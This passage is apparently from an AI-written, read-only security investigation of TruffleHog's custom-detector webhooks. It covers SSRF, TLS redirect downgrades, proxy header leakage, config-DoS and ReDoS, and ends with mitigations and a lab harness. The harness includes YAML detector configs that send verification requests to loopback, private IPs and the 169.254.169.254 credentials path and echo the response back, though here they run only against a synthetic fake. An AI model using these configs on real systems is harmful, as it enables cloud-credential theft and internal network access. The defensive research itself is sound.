5. **MITM the TLS on the direct hop (Q2).** System-CA chain **and** hostname/SAN verification are on by default and **cannot be disabled from a webhook config**: `unsafe` doesn't touch TLS, and **no TLS-verification-disabling path is reachable from a custom-detector webhook**. (The codebase's *other* `InsecureSkipVerify` usages — `WithInsecureTLS` for **source** connectors [`roundtripper.go:122-127`], the **LDAP detector** [`ldap/ldap.go:151,159`], and several `InsecureSkipVerifyTls` protobuf fields for Jenkins/Confluence/JIRA/Sentry — are all off the webhook path; see the Q2 mechanism note.) A self-signed, wrong-host, **or expired** certificate is rejected **before any request is sent** (Conditions A, C, E). **Three caveats shift this:** (a) there is **no certificate pinning**, so any CA the host already trusts — including an installed corporate/MITM interception root — is accepted; (b) a config author can point the endpoint at an HTTPS server that answers a redirect — `307`/`308` re-send the **secret body** to a `Location: http://…`, while `301`/`302`/`303` drop the body (POST→GET) but still re-send the `Authorization` header over cleartext to the same host (Condition D) — an actor-controlled downgrade; and (c) when the scanning host has `HTTP(S)_PROXY` set, the full secret body **and** `Authorization` are forwarded to that proxy, and a `Proxy-Authorization` header is **retained across a cross-origin redirect** even though `Authorization` is stripped (GO-2025-3751, Condition F).
6. **Trigger ReDoS (Q5).** Custom patterns run on Go's stdlib `regexp` (RE2 linear-time), which structurally prevents catastrophic backtracking; backreferences are rejected at config load. (This is distinct from the permutation-count config-DoS in item 4, which *is* exploitable.)

**Trust boundary and root cause.** The design implicitly assumes the detector-config author is trusted, and the motivating scenario — teams contributing configs — violates exactly that assumption. Every abuse above (1–4) stems from the same root: untrusted config fields are honored by the verification path with no destination allowlist, no request budget/throttle, no overflow guard, and a response-readback that turns dispatch into a read primitive.

**Mitigations (prose only — NOT implemented; this is a read-only investigation) [INFERRED, benchmarked against external guidance; non-exhaustive].**
- *SSRF (Q1):* resolve the endpoint host to its IP and reject reserved ranges (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`) **before** dispatch; prefer an allowlist to a denylist; canonicalize the scheme (case-insensitive); re-resolve and re-validate on every redirect hop, or disable redirect-following for verification. (OWASP SSRF Prevention Cheat Sheet.)
- *Readback (Q1):* do not echo verification response bodies into scan output, or gate the echo behind a destination allowlist.
- *Volume (Q3):* impose a global per-detector/per-scan request budget, an `errgroup` concurrency limit, and an inter-request throttle.
- *Config-DoS (Q3/C8):* guard the `productIndices` multiplication against overflow (or clamp operands before multiplying), and make `wgDoneFn()` deferred so a recovered panic cannot wedge the `WaitGroup`.
- *TLS downgrade & header leakage (Q2):* refuse `HTTPS→HTTP` redirects on the verification path (or strip the `Authorization` header and body across any redirect and re-validate the destination); consider certificate pinning for webhook endpoints; and note that host `HTTP(S)_PROXY` settings route the full secret through the proxy and that `Proxy-Authorization` survives a cross-origin redirect (GO-2025-3751).
- *Config trust (Q6):* treat detector configs as untrusted input — require review/signing before load, and document the trust assumption. (The feature is **alpha** and subject to change [`README.md:L644`].)

---

## Coverage pass (requirement → condition → command → evidence)

Every distinct sub-question and every named item (including the user's `169.254.169.254`) is enumerated below, with the canonical command that produced the evidence and the in-document section that shows the unedited output. All commands invoke the compiled binary through `trufflehog filesystem --config=<yaml> <target>` (shown as `th`).

| Req | Sub-question / named item | Condition | Canonical command (abridged) | Evidence |
|-----|---------------------------|-----------|------------------------------|----------|
| Q1 | Internal address dispatched? | loopback | `th filesystem --no-update --json --config=q1.yaml t.txt` | Q1.a |
| Q1 | 200 chars vs **bytes**? | aligned + unaligned multibyte | body 150×`U+00E9` (aligned); 199×`A`+`U+00E9` (unaligned → `U+FFFD`) | Q1.b-1, Q1.b-2 |
| Q1 | RFC1918 private reached? | `10.236.7.63` | endpoint = private IP | Q1.c |
| Q1 | Validation preventing it? | scheme/empty only | mixed-case `HTTP://` bypass; error contrast | Q1.d, Q1.e |
| Q1 | **`169.254.169.254`** (user example) | config loads; dispatched | `--no-verification` load; dispatch inside a disconnected network namespace (isolation gate) | Q1.f-1, Q1.f-2 |
| Q1 | IPv6 loopback dispatched? | `[::1]` | endpoint = `http://[::1]:PORT/…` (lab: IPv6 enabled on `lo`) | Q1.g |
| Q2 | Cert validation performed? | self-signed | `th … --no-verification-cache …` HTTPS mock, no `SSL_CERT_FILE` | Q2.A |
| Q2 | Valid chain accepted? | trusted CA, correct SAN | `SSL_CERT_FILE=ca.crt`, SAN `IP:127.0.0.1` | Q2.B |
| Q2 | Hostname checked? | trusted CA, wrong SAN | SAN `DNS:wrong.example.com` | Q2.C |
| Q2 | `unsafe` effect on TLS? | `unsafe:false` vs `true` | both configs vs self-signed | Q2.A |
| Q2 | Network-path interception? | redirect downgrade matrix | HTTPS→`http://`: `301/302/303` (→GET, drop body) vs `307/308` (→POST, keep body); `Authorization` re-sent in both | Q2.D |
| Q2 | Expired cert handling? | trusted CA, `notAfter` in past | expired leaf, correct SAN | Q2.E |
| Q2 | Proxy routing / header retention? | `HTTP(S)_PROXY`; cross-origin redirect | proxy env set; `Proxy-Authorization` retained across `307` (GO-2025-3751) | Q2.F |
| Q3 | Verify once or more? | single regex, N matches | `th … --scan-entire-chunk …`, N∈{5,50,99,100,101,150} | Q3.C1 |
| Q3 | More complex? | two named regexes | product 3×4, 11×10 | Q3.C2 |
| Q3 | Any limit / is 100 global? | per-span cap | multi-span (200) and multi-chunk (500); peek offset 5000→1 vs 11000→2 | Q3.C3 |
| Q3 | Multiple verifiers? | ×M | 3 verifiers all 500 | Q3.C4 |
| Q3 | Throttle / concurrency? | no limit | N=1 vs N=100 wall time | Q3.C5 |
| Q3 | Cache behavior? | default-on / off / collision | `--no-verification-cache` vs default; same secret two detectors | Q3.C6 |
| Q3 | Timeouts? | 5 s vs 10 s | client vs detection context | Q3.C7 |
| Q3 | Config-DoS overflow? | int64 overflow → hang | 10 regexes × 99 matches (**do not re-run**) | Q3.C8 |
| Q4 | Method/path/body? | basic capture | `th … --config=q4.yaml t.txt` | Q4.a |
| Q4 | Capture group in body? | group regex | `theToken: 'labtok_([a-z0-9]{6})'` | Q4.b |
| Q4 | Headers verbatim? | normalization | multi-colon, lower-key, dup keys | Q4.c |
| Q4 | User-Agent fixed? | default/suffix/override | `--user-agent-suffix`; config `User-Agent` header | Q4.d |
| Q4 | Multiple verifiers order? | until exact-200 | 500-then-200; both-500 | Q4.e |
| Q4 | `SuccessRanges` applied? | no-op | `successRanges:["200-299"]`, endpoint 204 | Q4.f |
| Q4 | Response-body / outcome edge cases? | empty/small/oversized/partial/refused/timeout | `RESP_BODYLEN=0/50/5000`; partial write (CL:5000, 100 B, close); no listener; 6 s reply | Q4.g |
| Q5 | Regex engine / safeguards? | evil vs benign | `th … --scan-entire-chunk …`, `(a+)+$` vs `zzzzzzzz`, scaled input | Q5.A |
| Q5 | Backreference handling? | RE2 hallmark | `(a)\1` at config load | Q5.B |
| Q6 | Abuse synthesis? | Q1–Q5 combined | (synthesis, no new command) | Q6 |

---

## Appendix — lab harness (for independent reproduction)

All artifacts below lived **outside** the repository checkout, under `/tmp/lab`, and were deleted after the investigation; the source tree was left byte-for-byte unchanged (verified with `git status --porcelain` returning empty). The binary was built outside the checkout with `CGO_ENABLED=0 go build -o /tmp/lab/th .` (Go 1.24.2). Mock servers bind **loopback only** (or, for the RFC1918 test, the container's own private address); ports are parameterized by `CLONE_INDEX` (`PORT_BASE = 18100 + CLONE_INDEX*200`) so parallel agents never collide; each writes a **readiness sentinel** after `bind()`. The two concurrency-sensitive mocks (`mock_http.py`, `mock_https.py`) use a large listen backlog (`request_queue_size = 1024`) so the harness never masquerades as product behavior during multiplicity counting, while the single-preflight `fake_imds.py` uses a smaller backlog (`request_queue_size = 128`); each caps request bodies at 1 MiB and is torn down by an **owned-PID `EXIT`/`INT`/`TERM` trap** (no broad `pkill`).

**`lib.sh`** - shared helpers (durable owned-PID teardown trap, `CLONE_INDEX`-parameterized ports `PORT_BASE = 18100 + CLONE_INDEX*200`, readiness wait). `start_http`/`start_https` launch the mocks whose response shape is controlled entirely by `RESP_*` env vars (documented in `mock_http.py`), so no positional response args are needed:

```bash
#!/usr/bin/env bash
# Shared safe-harness helpers. Mocks bind loopback (127.0.0.1 / ::1) or the
# container's own private IP for the RFC1918 test. Every spawned PID is recorded
# in a durable per-PID file under "$PID_DIR", so the parent shell's EXIT/INT/TERM
# trap reaps it even when a start_* helper is invoked via command substitution
# (pid=$(start_http ...)) — a case where a plain shell-array append would be lost
# inside the $(...) subshell. Ports are parameterised by CLONE_INDEX.
set -u
LAB=/tmp/lab
TH=/tmp/lab/th
PORT_BASE=$(( 18100 + ( ${CLONE_INDEX:-0} * 200 ) ))
PID_DIR="$LAB/pids"; mkdir -p "$PID_DIR"

_track_pid(){ echo "$1" > "$PID_DIR/$1.pid"; }

_cleanup(){
  local f pid
  for f in "$PID_DIR"/*.pid; do
    [ -e "$f" ] || continue
    pid=$(cat "$f" 2>/dev/null) || continue
    [ -n "${pid:-}" ] && kill "$pid" 2>/dev/null || true
  done
  for f in "$PID_DIR"/*.pid; do
    [ -e "$f" ] || continue
    pid=$(cat "$f" 2>/dev/null) || continue
    [ -n "${pid:-}" ] && wait "$pid" 2>/dev/null || true
    rm -f "$f"
  done
}
trap _cleanup EXIT INT TERM

wait_ready(){ local f="$1" t="${2:-10}" i=0
  while [ ! -s "$f" ]; do sleep 0.1; i=$((i+1)); [ "$i" -ge $((t*10)) ] && { echo "TIMEOUT $f" >&2; return 1; }; done; return 0; }

# start_http HOST PORT LOG READY  (response controlled by RESP_* env vars)
start_http(){ local host="$1" port="$2" log="$3" ready="$4"
  : > "$log"; rm -f "$ready"
  python3 "$LAB/mock_http.py" "$host" "$port" "$log" "$ready" >"$log.err" 2>&1 </dev/null &
  local pid=$!; _track_pid "$pid"; wait_ready "$ready" || return 1; echo "$pid"; }

# start_https HOST PORT LOG READY COUNTER CERT KEY  (RESP_* env vars)
start_https(){ local host="$1" port="$2" log="$3" ready="$4" counter="$5" cert="$6" key="$7"
  : > "$log"; rm -f "$ready" "$counter"
  python3 "$LAB/mock_https.py" "$host" "$port" "$log" "$ready" "$counter" "$cert" "$key" >"$log.err" 2>&1 </dev/null &
  local pid=$!; _track_pid "$pid"; wait_ready "$ready" || return 1; echo "$pid"; }

stop_pid(){ kill "$1" 2>/dev/null || true; wait "$1" 2>/dev/null || true; rm -f "$PID_DIR/$1.pid" 2>/dev/null || true; }
```

**`mock_http.py`** - threaded plaintext mock. Records method / path / all headers / body as one JSON line per request; the response is **env-driven** - `RESP_STATUS` (default 200), `RESP_BODYLEN` (all-`X` body length, default 2 = `"OK"`), `RESP_BODY_B64` (exact body for the multibyte / unaligned-UTF-8 tests), `RESP_LOCATION` (3xx redirect target), `RESP_DELAY` (seconds to sleep, for the timeout test) - so a single mock covers Q1/Q3/Q4 and the redirect and body-edge cases. IPv6-aware (`AF_INET6` when the host contains `:`), 1 MiB request-body cap, 1024 listen backlog, also records `Proxy-Authorization`:

```python
#!/usr/bin/env python3
"""Safe threaded plaintext HTTP mock for the TruffleHog webhook investigation.

Safety: binds only to the HOST on argv (tests use loopback 127.0.0.1, ::1, or
the container's own RFC1918 address); bounded body read (1 MiB) so a large body
cannot exhaust mock memory; atomic counter; one JSON log line per request (body
truncated to 4096 in the log); writes a READY sentinel after bind(); large
listen backlog.

Response is env-driven so one mock covers every case:
  RESP_STATUS   (default 200)        HTTP status to return
  RESP_BODYLEN  (default 2 => "OK")  length of an all-'X' body (ignored if RESP_BODY_B64 set)
  RESP_BODY_B64 (optional)           exact response body, base64 (for multibyte/unaligned tests)
  RESP_LOCATION (optional)           Location header (for 3xx redirect tests)
  RESP_DELAY    (default 0)          seconds to sleep before responding (timeout tests)

Usage: mock_http.py HOST PORT LOG READYFILE
"""
import sys, os, socketserver, http.server, threading, json, base64, time

HOST = sys.argv[1]; PORT = int(sys.argv[2]); LOG = sys.argv[3]; READYFILE = sys.argv[4]
STATUS   = int(os.environ.get("RESP_STATUS", "200"))
BODYLEN  = int(os.environ.get("RESP_BODYLEN", "2"))
BODY_B64 = os.environ.get("RESP_BODY_B64", "")
LOCATION = os.environ.get("RESP_LOCATION", "")
DELAY    = float(os.environ.get("RESP_DELAY", "0"))

REQ_BODY_CAP = 1 << 20
LOG_BODY_CAP = 4096
if BODY_B64:
    RESP = base64.b64decode(BODY_B64)
else:
    RESP = b"OK" if BODYLEN == 2 else (b"X" * BODYLEN)

counter = {"n": 0}
lock = threading.Lock()

class Handler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def _handle(self):
        length = min(int(self.headers.get("Content-Length", 0) or 0), REQ_BODY_CAP)
        body = self.rfile.read(length) if length else b""
        with lock:
            counter["n"] += 1; n = counter["n"]
        rec = {"seq": n, "method": self.command, "path": self.path,
               "ua": self.headers.get("User-Agent"),
               "auth": self.headers.get("Authorization"),
               "proxy_auth": self.headers.get("Proxy-Authorization"),
               "content_type": self.headers.get("Content-Type"),
               "ua_all": self.headers.get_all("User-Agent"),
               "headers": [[k, v] for k, v in self.headers.items()],
               "body": body[:LOG_BODY_CAP].decode("utf-8", "replace")}
        with open(LOG, "a") as fh:
            fh.write(json.dumps(rec) + "\n")
        if DELAY > 0:
            time.sleep(DELAY)
        self.send_response(STATUS)
        if LOCATION:
            self.send_header("Location", LOCATION)
        self.send_header("Content-Length", str(len(RESP)))
        self.end_headers()
        try:
            self.wfile.write(RESP)
        except Exception:
            pass
    def do_POST(self): self._handle()
    def do_GET(self): self._handle()
    def do_PUT(self): self._handle()
    def log_message(self, *a): pass

class Srv(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    request_queue_size = 1024
    allow_reuse_address = True
    address_family = __import__("socket").AF_INET6 if ":" in HOST else __import__("socket").AF_INET

if __name__ == "__main__":
    srv = Srv((HOST, PORT), Handler)
    with open(READYFILE, "w") as fh:
        fh.write("ready %s:%d\n" % (HOST, PORT))
    srv.serve_forever()
```

**`mock_https.py`** - threaded configurable-cert HTTPS mock (Q2). Wraps the socket in `SSLContext(PROTOCOL_TLS_SERVER)` and separately counts **app-layer** requests (handshake completed) vs **handshake_errors** (client rejected our cert), flushing both to a counter file. Shares the `RESP_STATUS` / `RESP_LOCATION` / `RESP_DELAY` env knobs and records `Proxy-Authorization`:

```python
#!/usr/bin/env python3
"""Safe threaded configurable-cert HTTPS mock (Q2).

Wraps the listening socket in an SSLContext(PROTOCOL_TLS_SERVER) with the
supplied cert/key. get_request() performs the TLS handshake inside a
try/except so the server separately counts:
  - app_layer      : requests that completed a handshake, and
  - handshake_errors: handshake FAILURES (client rejecting our cert).
Counters flushed to COUNTERFILE as JSON on every event. READY sentinel after
bind(). Binds only to HOST on argv (loopback).

Env knobs mirror mock_http.py: RESP_STATUS, RESP_LOCATION, RESP_DELAY.

Usage: mock_https.py HOST PORT LOG READYFILE COUNTERFILE CERT KEY
"""
import sys, os, ssl, socketserver, http.server, threading, json, time

HOST=sys.argv[1]; PORT=int(sys.argv[2]); LOG=sys.argv[3]; READYFILE=sys.argv[4]
COUNTERFILE=sys.argv[5]; CERT=sys.argv[6]; KEY=sys.argv[7]
STATUS=int(os.environ.get("RESP_STATUS","200"))
LOCATION=os.environ.get("RESP_LOCATION","")
DELAY=float(os.environ.get("RESP_DELAY","0"))

REQ_BODY_CAP=1<<20; RESP=b"OK"
counters={"app_layer":0,"handshake_errors":0,"last_error":None}
lock=threading.Lock()

def flush():
    with open(COUNTERFILE,"w") as fh:
        fh.write(json.dumps(counters)+"\n")

class Handler(http.server.BaseHTTPRequestHandler):
    protocol_version="HTTP/1.1"
    def _handle(self):
        length=min(int(self.headers.get("Content-Length",0) or 0),REQ_BODY_CAP)
        body=self.rfile.read(length) if length else b""
        with lock:
            counters["app_layer"]+=1; flush()
        with open(LOG,"a") as fh:
            fh.write(json.dumps({"method":self.command,"path":self.path,
                "auth":self.headers.get("Authorization"),
                "proxy_auth":self.headers.get("Proxy-Authorization"),
                "ua":self.headers.get("User-Agent"),
                "body":body[:4096].decode("utf-8","replace")})+"\n")
        if DELAY>0: time.sleep(DELAY)
        self.send_response(STATUS)
        if LOCATION: self.send_header("Location",LOCATION)
        self.send_header("Content-Length",str(len(RESP)))
        self.end_headers()
        try: self.wfile.write(RESP)
        except Exception: pass
    def do_POST(self): self._handle()
    def do_GET(self): self._handle()
    def log_message(self,*a): pass

class Srv(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads=True; request_queue_size=1024; allow_reuse_address=True
    def __init__(self, addr, handler, ctx):
        super().__init__(addr, handler); self._ctx=ctx
    def get_request(self):
        sock,addr=self.socket.accept()
        try:
            tls=self._ctx.wrap_socket(sock, server_side=True)
            return tls,addr
        except (ssl.SSLError, OSError) as e:
            with lock:
                counters["handshake_errors"]+=1; counters["last_error"]=str(e); flush()
            try: sock.close()
            except OSError: pass
            raise

if __name__=="__main__":
    ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(CERT,KEY)
    srv=Srv((HOST,PORT),Handler,ctx)
    flush()
    with open(READYFILE,"w") as fh:
        fh.write("ready %s:%d\n"%(HOST,PORT))
    srv.serve_forever()
```

**`mock_partial.py`** - partial-body mock (Q4.g). Answers `200 OK` declaring `Content-Length: 5000` but writes only 100 bytes then closes the socket, forcing the client's `io.ReadAll` to fail with an unexpected-EOF error **after** `Verified=true` has already been set (`custom_detectors.go:L251` precedes `L253`), so the finding verifies but stores no `response`:

```python
#!/usr/bin/env python3
"""Partial-body mock: sends 200 OK with Content-Length:5000 but writes only
100 bytes then closes the socket, forcing io.ReadAll on the client to fail with
unexpected EOF. Logs one JSON line per request. Usage: mock_partial.py HOST PORT LOG READY"""
import sys, socket, threading, json
HOST=sys.argv[1]; PORT=int(sys.argv[2]); LOG=sys.argv[3]; READY=sys.argv[4]
srv=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind((HOST,PORT)); srv.listen(1024)
open(READY,"w").write("ready\n")
lock=threading.Lock(); n=[0]
def handle(c):
    data=c.recv(65536)
    with lock:
        n[0]+=1; seq=n[0]
    # parse request line + rough body
    txt=data.decode("utf-8","replace")
    line=txt.split("\r\n",1)[0]
    body=txt.split("\r\n\r\n",1)[1] if "\r\n\r\n" in txt else ""
    with open(LOG,"a") as fh:
        fh.write(json.dumps({"seq":seq,"reqline":line,"body":body})+"\n")
    # declare 5000 but send 100 then close -> client ReadAll gets unexpected EOF
    c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 5000\r\n\r\n" + b"P"*100)
    c.close()
while True:
    c,_=srv.accept(); threading.Thread(target=handle,args=(c,),daemon=True).start()
```

**`fake_imds.py`** - clearly-SYNTHETIC fake metadata endpoint used **only** inside the isolated network namespace below. Returns an obviously-fake **264-byte** credential-shaped blob (`FAKE-SYNTHETIC-LAB-ONLY-...`) and never contacts or proxies to any real endpoint; 128 listen backlog:

```python
#!/usr/bin/env python3
"""Clearly-SYNTHETIC fake IMDS used ONLY inside an isolated network namespace
that has NO route to the real metadata service. Returns an obviously-fake,
>200-byte credential-shaped blob and logs each request. Never contacts and
never proxies to any real endpoint."""
import sys, http.server, socketserver, json
HOST, PORT, LOG, READY = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4]
FAKE = (b'{"Code":"Success","Type":"AWS-HMAC",'
        b'"AccessKeyId":"FAKE-SYNTHETIC-LAB-ONLY-AKIA0000",'
        b'"SecretAccessKey":"FAKE-SYNTHETIC-LAB-ONLY-DO-NOT-USE-000000000000",'
        b'"Token":"FAKE-SYNTHETIC-SESSION-TOKEN-LAB-ONLY-abcdefghijklmnopqrstuvwxyz",'
        b'"Expiration":"2099-01-01T00:00:00Z"}')  # 264 bytes, all synthetic
class H(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    def _h(self):
        l = min(int(self.headers.get("Content-Length", 0) or 0), 1 << 20)
        body = self.rfile.read(l) if l else b""
        with open(LOG, "a") as fh:
            fh.write(json.dumps({"method": self.command, "path": self.path,
                                 "ua": self.headers.get("User-Agent"),
                                 "metadata_hdr": self.headers.get("Metadata"),
                                 "body": body[:4096].decode("utf-8", "replace")}) + "\n")
        self.send_response(200); self.send_header("Content-Length", str(len(FAKE)))
        self.end_headers(); self.wfile.write(FAKE)
    def do_POST(self): self._h()
    def do_GET(self): self._h()
    def log_message(self, *a): pass
class S(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True; allow_reuse_address = True; request_queue_size = 128
if __name__ == "__main__":
    s = S((HOST, PORT), H)
    open(READY, "w").write("ready\n")
    s.serve_forever()
```

**`gen_certs.sh`** - generates every TLS asset for Q2 with `openssl`: a self-signed leaf (`ss.crt`, SAN `IP:127.0.0.1`), a private CA (`ca.crt`), a CA-signed leaf with the **correct** SAN (`leaf.crt` / `leaf_fullchain.crt`), a CA-signed leaf with a **wrong** SAN (`wrong.crt`, `DNS:wrong.example.com`), and an **expired** CA-signed leaf (`expired.crt`, `-days -1`). The CA is trusted at runtime via `SSL_CERT_FILE=certs/ca.crt`:

```bash
#!/usr/bin/env bash
set -euo pipefail
D=/tmp/lab/certs; mkdir -p "$D"; cd "$D"
# 1) self-signed leaf, SAN IP:127.0.0.1
openssl req -x509 -newkey rsa:2048 -nodes -keyout ss.key -out ss.crt -days 2 \
  -subj "/CN=127.0.0.1" -addext "subjectAltName=IP:127.0.0.1" >/dev/null 2>&1
# 2) private CA
openssl req -x509 -newkey rsa:2048 -nodes -keyout ca.key -out ca.crt -days 2 \
  -subj "/CN=Lab Test CA" >/dev/null 2>&1
# 3) leaf signed by CA, correct SAN IP:127.0.0.1
openssl req -newkey rsa:2048 -nodes -keyout leaf.key -out leaf.csr \
  -subj "/CN=127.0.0.1" >/dev/null 2>&1
openssl x509 -req -in leaf.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
  -out leaf.crt -days 2 -extfile <(printf "subjectAltName=IP:127.0.0.1") >/dev/null 2>&1
cat leaf.crt ca.crt > leaf_fullchain.crt
# 4) leaf signed by CA, WRONG SAN DNS:wrong.example.com
openssl req -newkey rsa:2048 -nodes -keyout wrong.key -out wrong.csr \
  -subj "/CN=wrong.example.com" >/dev/null 2>&1
openssl x509 -req -in wrong.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
  -out wrong.crt -days 2 -extfile <(printf "subjectAltName=DNS:wrong.example.com") >/dev/null 2>&1
cat wrong.crt ca.crt > wrong_fullchain.crt
# 5) EXPIRED leaf signed by CA, correct SAN (valid 1 day, ending yesterday)
openssl req -newkey rsa:2048 -nodes -keyout expired.key -out expired.csr \
  -subj "/CN=127.0.0.1" >/dev/null 2>&1
openssl x509 -req -in expired.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
  -out expired.crt -days -1 -extfile <(printf "subjectAltName=IP:127.0.0.1") >/dev/null 2>&1
cat expired.crt ca.crt > expired_fullchain.crt
echo "certs generated in $D:"; ls -1 "$D"/*.crt
echo "-- self-signed not-after --"; openssl x509 -in ss.crt -noout -enddate
echo "-- expired not-after --"; openssl x509 -in expired.crt -noout -enddate
```

**`run_q1_metadata_netns.sh`** - the genuinely fail-closed `169.254.169.254` harness that produced Q1.f-2. It builds an **isolated network namespace** (`labns`) with **no default route** and only a local `169.254.169.254/32` on `lo`, so a packet to the metadata IP can reach **only** the synthetic fake; the real IMDS is physically unreachable. A **hard isolation gate** aborts the run (`exit 8`/`9`) unless the namespace has no default route **and** an external-IP probe (`curl http://8.8.8.8/`) fails; `set -euo pipefail` aborts before TruffleHog runs if any setup step fails. No host `iptables` rule is touched:

```bash
#!/usr/bin/env bash
# FAIL-CLOSED 169.254.169.254 dispatch proof via an ISOLATED network namespace.
# The netns has NO default route and only a local 169.254.169.254/32 on lo, so a
# packet to the metadata IP can ONLY reach the synthetic fake; the real IMDS is
# physically unreachable (proven by an external-IP probe that fails).
set -euo pipefail
NS=labns
LOG=/tmp/lab/logs/q1meta.log; READY=/tmp/lab/logs/q1meta.ready
FAKEPID=""
teardown(){
  [ -n "$FAKEPID" ] && kill "$FAKEPID" 2>/dev/null || true
  [ -n "$FAKEPID" ] && wait "$FAKEPID" 2>/dev/null || true
  ip netns delete "$NS" 2>/dev/null || true
}
trap teardown EXIT INT TERM

# (re)build the isolated namespace
ip netns delete "$NS" 2>/dev/null || true
ip netns add "$NS"
ip netns exec "$NS" ip link set lo up
ip netns exec "$NS" ip addr add 169.254.169.254/32 dev lo

# HARD SAFETY GATE: the namespace must have NO route to any external network.
if ip netns exec "$NS" ip route show | grep -q default; then echo "ABORT: unexpected default route"; exit 9; fi
if ip netns exec "$NS" timeout 4 curl -s -o /dev/null --max-time 3 http://8.8.8.8/ 2>/dev/null; then
  echo "ABORT: external network reachable from netns — NOT fail-closed"; exit 8; fi
echo "=== isolation gate PASSED: no default route; external IP unreachable ==="

# start the SYNTHETIC fake on the exact metadata IP INSIDE the isolated netns
: > "$LOG"; rm -f "$READY"
ip netns exec "$NS" python3 /tmp/lab/fake_imds.py 169.254.169.254 80 "$LOG" "$READY" >/tmp/lab/logs/q1meta.err 2>&1 &
FAKEPID=$!
for i in $(seq 1 50); do [ -s "$READY" ] && break; sleep 0.1; done
[ -s "$READY" ] || { echo "ABORT: fake not ready"; exit 5; }

cat > /tmp/lab/cfg/q1meta.yaml <<YAML
detectors:
  - name: MetadataSSRFDetector
    keywords: [labtok]
    regex: { theToken: 'labtok_[a-z0-9]{6}' }
    verify:
      - endpoint: http://169.254.169.254/latest/meta-data/iam/security-credentials/
        unsafe: true
        headers: ["Metadata: true"]
YAML
printf 'labtok_aaa111\n' > /tmp/lab/targets/q1meta.txt

for run in 1 2; do
  echo "=== trufflehog run $run (inside isolated netns, canonical CLI) ==="
  ip netns exec "$NS" /tmp/lab/th filesystem --no-update --json \
     --config=/tmp/lab/cfg/q1meta.yaml /tmp/lab/targets/q1meta.txt 2>/dev/null \
   | python3 -c "
import sys,json
for ln in sys.stdin:
    ln=ln.strip()
    if ln[:1]=='{':
        try: d=json.loads(ln)
        except: continue
        if 'Verified' in d:
            r=d.get('ExtraData',{}).get('response','')
            print('  Verified=%s'%d['Verified'])
            print('  echoed_response(len=%d): %s'%(len(r), r))
"
done
echo "=== request(s) captured at the SYNTHETIC fake standing in for 169.254.169.254 ==="
sed 's/^/  /' "$LOG"
```

**`parse_q4.py`** - tiny `--json` reader used by Q4.g: given a detector name and a TruffleHog `--json` output file, it prints whether the finding is `Verified`, whether `ExtraData` contains a `response` key, and that response's byte length:

```python
import sys, json
det=sys.argv[1]; path=sys.argv[2]
v=None; has=None; ln=None; rep=None; found=False
for line in open(path, encoding="utf-8", errors="replace"):
    line=line.strip()
    if not line or not line.startswith("{"): continue
    try: o=json.loads(line)
    except: continue
    ed=o.get("ExtraData") or {}
    if ed.get("name")==det:
        found=True; v=o.get("Verified")
        if "response" in ed:
            has=True; s=ed["response"]; ln=len(s); rep=(s[:40]+("..." if len(s)>40 else ""))
        else:
            has=False
        break
print(f"found={found} Verified={v} has_response_key={has} resp_len={ln} resp_first40={rep!r}")
```

**Lab setup and per-question driver recipes.** Every artifact lives under `/tmp/lab` (outside the checkout). Build once, generate certs once, then drive each question with a minimal config through the canonical CLI. `PB=$((18100 + ${CLONE_INDEX:-0}*200))` mirrors `lib.sh`.

```bash
# 0) one-time: binary (outside the checkout) + TLS assets + dirs + helpers
cd <checkout>; CGO_ENABLED=0 go build -o /tmp/lab/th .      # source tree stays read-only
cd /tmp/lab; mkdir -p cfg targets logs pids; bash gen_certs.sh
source /tmp/lab/lib.sh                                       # exports PORT_BASE, start_http/https, traps
P=$PORT_BASE

# Q1.a - loopback SSRF dispatch + 200-byte readback (325-byte body truncates to 200)
RESP_BODYLEN=325 start_http 127.0.0.1 $P logs/q1a.log logs/q1a.ready >/dev/null
cat > cfg/q1a.yaml <<YAML
detectors: [ { name: LoopbackSSRF, keywords: [labtok], regex: { theToken: 'labtok_[a-z0-9]{6}' },
  verify: [ { endpoint: 'http://127.0.0.1:'$P'/', unsafe: true } ] } ]
YAML
printf 'labtok_aaa111\n' > targets/q1a.txt
/tmp/lab/th filesystem --no-update --json --config=cfg/q1a.yaml targets/q1a.txt

# Q1.b - 200 BYTES vs chars: aligned (150 x U+00E9) and unaligned (199 x 'A' + U+00E9)
python3 - <<'PY'   # emit the two base64 bodies used for RESP_BODY_B64
import base64
print("ALIGNED  ", base64.b64encode(("\u00e9"*150).encode()).decode())
print("UNALIGNED", base64.b64encode(("A"*199 + "\u00e9").encode()).decode())
PY
# start mock with RESP_BODY_B64=<one of the above>, endpoint as in q1a; read
# ExtraData.response length + last codepoint from --json (unaligned ends U+FFFD).

# Q1.g - IPv6 loopback (lab prerequisite: enable IPv6 on lo, reverted afterwards)
sysctl -w net.ipv6.conf.lo.disable_ipv6=0 net.ipv6.conf.all.disable_ipv6=0
start_http ::1 $P logs/q1g.log logs/q1g.ready >/dev/null
cat > cfg/q1g.yaml <<YAML
detectors: [ { name: IPv6SSRF, keywords: [labtok], regex: { theToken: 'labtok_[a-z0-9]{6}' },
  verify: [ { endpoint: 'http://[::1]:'$P'/v6', unsafe: true } ] } ]
YAML
printf 'labtok_ggg777\n' > targets/q1g.txt
/tmp/lab/th filesystem --no-update --json --config=cfg/q1g.yaml targets/q1g.txt

# Q1.f - the EXACT 169.254.169.254 endpoint, only inside the fail-closed namespace
bash /tmp/lab/run_q1_metadata_netns.sh     # aborts (exit 8/9) unless provably off-network

# Q2 - TLS: point verify at the HTTPS mock; trust the private CA via SSL_CERT_FILE
start_https 127.0.0.1 $P logs/q2.log logs/q2.ready logs/q2.cnt certs/leaf_fullchain.crt certs/leaf.key >/dev/null
cat > cfg/q2.yaml <<YAML
